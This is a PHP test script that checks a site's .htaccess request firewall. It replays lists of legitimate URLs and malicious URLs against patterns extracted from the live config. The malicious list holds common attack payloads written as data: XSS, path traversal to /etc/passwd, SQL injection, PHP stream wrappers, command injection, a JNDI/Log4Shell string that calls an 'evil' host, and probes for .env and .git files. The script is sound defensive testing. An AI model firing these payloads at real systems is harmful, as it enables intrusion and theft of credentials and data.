<?php
// ============================================================
//  test-waf.php — guards the .htaccess request firewall (the RewriteCond block
//  that bounces obvious injection/scan attempts to /blocked). CI can't run Apache,
//  so this EXTRACTS the live RewriteCond patterns from htaccess.txt and replays a
//  corpus of legit + malicious URLs against them (as PCRE, case-insensitive, like
//  mod_rewrite's [NC]). It fails if a legit CHB URL would be blocked (false
//  positive → broken site) or a known attack would slip through (coverage gap).
//  Because it reads the real htaccess, the patterns can never drift out of sync.
// ============================================================

$ht = file_get_contents(__DIR__ . '/htaccess.txt');
if ($ht === false) {
    fwrite(STDERR, "cannot read htaccess.txt\n");
    exit(1);
}
// Pull the firewall block (between its banner comments) and grab the QUERY_STRING
// and REQUEST_URI RewriteCond patterns from it.
$block = '';
if (preg_match('/Request firewall.*?RewriteRule \^blocked/s', $ht, $m)) {
    $block = $m[0];
}
$Q = [];
$U = [];
foreach (explode("\n", $block) as $line) {
    if (preg_match('/^RewriteCond %\{QUERY_STRING\}\s+(.*?)\s+\[NC/', $line, $mm)) {
        $Q[] = $mm[1];
    } elseif (preg_match('/^RewriteCond %\{REQUEST_URI\}\s+(.*?)\s+\[NC/', $line, $mm)) {
        $U[] = $mm[1];
    }
}
if (!$Q || !$U) {
    fwrite(STDERR, "could not extract firewall patterns from htaccess.txt (found " . count($Q) . " query / " . count($U) . " uri)\n");
    exit(1);
}

function waf_blocked($uri, $q, $Q, $U)
{
    foreach ($Q as $p) {
        if (@preg_match('#' . $p . '#i', $q) === 1) {
            return true;
        }
    }
    foreach ($U as $p) {
        if (@preg_match('#' . $p . '#i', $uri) === 1) {
            return true;
        }
    }
    return false;
}

// LEGIT — must ALWAYS pass (a false positive here breaks the real site).
$legit = [
    ['/', ''], ['/index.html', ''], ['/cottages/jollyboat', ''], ['/cottages/21a-westgate', ''],
    ['/experiences', ''], ['/status', ''], ['/review/pimpernel', 'from=airbnb'], ['/sitemap.xml', ''],
    ['/index.html', 'pay=deadbeef0123abcd&b=5&k=deposit'], ['/index.html', 'magic=ab12cd34ef56'],
    ['/index.html', 'mlogin=5&t=1699999999&k=abcdef123456'], ['/index.html', 'arrival=1'],
    ['/img.php', 'src=uploads/hero-live.webp&w=900'], ['/img.php', 'src=uploads/card-jollyboat_1699.jpg&w=800'],
    ['/cron.php', 'cron=SOMESECRET123'], ['/track.php', 'action=summary&days=30'], ['/accounts.php', 'year=2026'],
    ['/email-optout.php', 'e=guest%40example.com&t=token123'], ['/search.php', 'q=Featherstonehaugh-Smythe'],
    ['/search.php', "q=O'Brien"], ['/search.php', 'q=Jos%C3%A9'], ['/app.js', 'v=392'], ['/app.css', 'v=186'],
    ['/enquiry-action.php', 'a=approve&e=123&token=abcDEF123'], ['/review/jollyboat', 'from=vrbo'],
    ['/manifest.json', ''], ['/uploads/photo_1699999999.jpg', ''], ['/blocked', ''],
    ['/search.php', 'q=deposit and balance'], ['/search.php', 'q=who owes me money'],
    ['/pay.php', 'action=summary&b=7&k=balance'], ['/search.php', 'q=reunion booking'],
    ['/search.php', 'q=a select of dates'], ['/leads.php', 'from=2026-07-01&to=2026-07-31'],
];
// MALICIOUS — must ALWAYS be blocked.
$malicious = [
    ['/index.html', 'q=<script>alert(1)</script>'], ['/index.html', 'q=%3Cscript%3Ealert(1)%3C/script%3E'],
    ['/x.php', 'file=../../../etc/passwd'], ['/x.php', 'file=..%2f..%2fetc%2fpasswd'],
    ['/img.php', 'src=uploads/x.jpg%00.php'], ['/x.php', 'id=1 UNION SELECT password FROM admins'],
    ['/x.php', 'id=1%20union%20select%20*'], ['/x.php', 'id=1 and information_schema.tables'],
    ['/x.php', 'u=php://filter/convert.base64-encode/resource=config.php'],
    ['/x.php', 'u=data://text/plain;base64,PD9waHA'], ['/x.php', 'cmd=system(id)'],
    ['/x.php', 'x=${jndi:ldap://evil}'], ['/x.php', 'x={{7*7}}'], ['/index.html', 'x=javascript:alert(1)'],
    ['/index.html', 'img=x onerror=alert(1)'], ['/etc/passwd', ''], ['/.env', ''], ['/wp-login.php', ''],
    ['/.git/config', ''], ['/index.html', 'a=1&b=<img src=x onerror=alert(1)>'],
    ['/x.php', 'q=sleep(5)'], ['/x.php', 'q=1) benchmark(1000000,md5(1))'],
    ['/xmlrpc.php', ''], ['/vendor/phpunit/eval-stdin.php', ''], ['/x.php', 'r=expect://id'],
    ['/x.php', 'p=%2e%2e/%2e%2e/config.php'], ['/index.html', 'x=<svg/onload=alert(1)>'],
    ['/x.php', 'id=1/**/union/**/select/**/1'], ['/x.php', 'u=file:///etc/passwd'],
];

$fails = 0;
foreach ($legit as [$u, $q]) {
    if (waf_blocked($u, $q, $Q, $U)) {
        echo "  ✗ FALSE POSITIVE (legit blocked): $u ? $q\n";
        $fails++;
    }
}
foreach ($malicious as [$u, $q]) {
    if (!waf_blocked($u, $q, $Q, $U)) {
        echo "  ✗ MISS (malicious allowed): $u ? $q\n";
        $fails++;
    }
}
if ($fails === 0) {
    echo '  ✓ request firewall: ' . count($legit) . ' legit URLs pass, ' . count($malicious) . " attack URLs blocked\n";
    echo "\nALL WAF CHECKS PASSED ✅\n";
    exit(0);
}
echo "\n$fails WAF CHECK(S) FAILED ❌\n";
exit(1);
